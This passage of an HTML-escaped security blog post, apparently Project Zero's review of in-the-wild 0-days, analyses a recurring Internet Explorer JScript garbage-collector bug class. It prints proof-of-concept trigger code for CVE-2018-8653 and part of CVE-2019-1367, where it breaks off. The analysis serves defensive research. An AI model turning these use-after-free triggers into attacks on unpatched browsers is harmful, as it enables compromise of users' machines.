rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2014-9665&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Apple Safari&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c30" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-27930&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2015-0093&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c35"&gt;&lt;td class="c38" colspan="3" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;* vulnerability was also exploited in-the-wild in previous years&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.k0ack2noqebb"&gt;&lt;span class="c33 c4"&gt;Internet Explorer JScript CVE-2020-0674&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;CVE-2020-0674 is the fourth vulnerability that&amp;rsquo;s been exploited in this bug class in 2 years. The other three vulnerabilities are CVE-2018-8653, CVE-2019-1367, and CVE-2019-1429. In the &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://googleprojectzero.blogspot.com/2020/07/detection-deficit-year-in-review-of-0.html"&gt;2019 year-in-review&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;we devoted a section to these vulnerabilities. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://www.blog.google/threat-analysis-group/identifying-vulnerabilities-and-protecting-you-phishing/"&gt;Google&amp;rsquo;s Threat Analysis Group attributed&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;all four exploits to the same threat actor. &lt;/span&gt;&lt;span&gt;It bears repeating, the same actor exploited similar vulnerabilities four separate times.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For all four exploits, the attacker used the same vulnerability type and the same exact exploitation method&lt;/span&gt;&lt;span class="c11 c4"&gt;. Fixing these vulnerabilities comprehensively the first time would have caused attackers to work harder or find new 0-days.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;JScript is the legacy Javascript engine in Internet Explorer. While it&amp;rsquo;s legacy, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://support.microsoft.com/en-us/topic/option-to-disable-jscript-execution-in-internet-explorer-9e3b5ab3-8115-4650-f3d8-e496e7f8e40e"&gt;by default it is still enabled&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in Internet Explorer 11, which is a built-in feature of &lt;/span&gt;&lt;span&gt;Windows 10 computers&lt;/span&gt;&lt;span&gt;. The bug class, or type of vulnerability, is that a specific JScript &lt;/span&gt;&lt;span&gt;object&lt;/span&gt;&lt;span&gt;, a &lt;/span&gt;&lt;span class="c31"&gt;variable&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;(uses the VAR struct), is not tracked by the garbage collector. I&amp;rsquo;ve included the code to trigger each of the four vulnerabilities below to demonstrate how similar they are. Ivan Fratric from Project Zero wrote all of the included code that triggers the four vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c7 c3" id="h.667740l9k8k0"&gt;&lt;span class="c16 c4"&gt;CVE-2018-8653&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In December 2018, it was discovered that &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8653"&gt;CVE-2018-8653&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was being actively exploited. In this vulnerability, the &lt;/span&gt;&lt;span class="c23"&gt;this&lt;/span&gt;&lt;span&gt;&amp;nbsp;variable is not tracked by the garbage collector in the &lt;/span&gt;&lt;span class="c23"&gt;isPrototypeof&lt;/span&gt;&lt;span&gt;&amp;nbsp;callback. McAfee also wrote a &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ie-scripting-flaw-still-a-threat-to-unpatched-systems-analyzing-cve-2018-8653/"&gt;write-up going through each step of this exploit&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.1f8226adda08b392a30970fd8b644091a916c945"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;objs &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;refs &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;dummyObj &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Object&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;function&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;getFreeRef&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 5. delete prototype objects as well as ordinary objects&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;10000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; objs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CollectGarbage&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;200&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; refs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;].&lt;/span&gt;&lt;span class="c2"&gt;prototype &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 6. Garbage collector frees unused variable blocks.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// This includes the one holding the &amp;quot;this&amp;quot; variable&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CollectGarbage&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 7. Boom&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; alert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;this&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 1. create &amp;quot;special&amp;quot; objects for which isPrototypeOf can be invoked&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;200&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;arr &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span class="c1"&gt;({&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;prototype&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{}&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;});&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;e &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Enumerator&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;arr&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; refs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;e&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c2"&gt;item&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 2. create a bunch of ordinary objects&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;10000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; objs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Object&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 3. create objects to serve as prototypes and set up callbacks&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;200&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; refs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;].&lt;/span&gt;&lt;span class="c2"&gt;prototype &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{};&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; refs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;].&lt;/span&gt;&lt;span class="c2"&gt;prototype&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c2"&gt;isPrototypeOf &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;getFreeRef&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 4. calls isPrototypeOf. This sets up refs[100].prototype as &amp;quot;this&amp;quot; variable&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// During callback, the &amp;quot;this&amp;quot; variable won&amp;#39;t be tracked by the Garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// use different index if this doesn&amp;#39;t work&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;dummyObj &lt;/span&gt;&lt;span class="c6"&gt;instanceof&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;refs&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;100&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 class="c7 c3" id="h.ine73rgba0in"&gt;&lt;span class="c16 c4"&gt;CVE-2019-1367&lt;/span&gt;&lt;/h3&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In September 2019, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1367"&gt;CVE-2019-1367&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;was detected as exploited in-the-wild. This is the same vulnerability type as CVE-2018-8653: a JScript &lt;/span&gt;&lt;span class="c31"&gt;variable&lt;/span&gt;&lt;span&gt;&amp;nbsp;object&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not tracked by the garbage collector. This time though the &lt;/span&gt;&lt;span class="c31"&gt;variables&lt;/span&gt;&lt;span&gt;&amp;nbsp;that are not tracked are in the &lt;/span&gt;&lt;span class="c23"&gt;arguments&lt;/span&gt;&lt;span&gt;&amp;nbsp;array in the &lt;/span&gt;&lt;span class="c23"&gt;Array.sort&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;callback.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.43a0a5db0b1d20befc1e52448e47d5adb550749a"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Array&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;function&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;F&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 2. Create a bunch of objects&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;i&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;new&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Object&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 3. Store a reference to one of them in the arguments array&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;The arguments array isn&amp;#39;t tracked by garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; arguments&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;5000&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 4. Delete the objects and call the garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;All JSCript variables get reclaimed... &lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;i 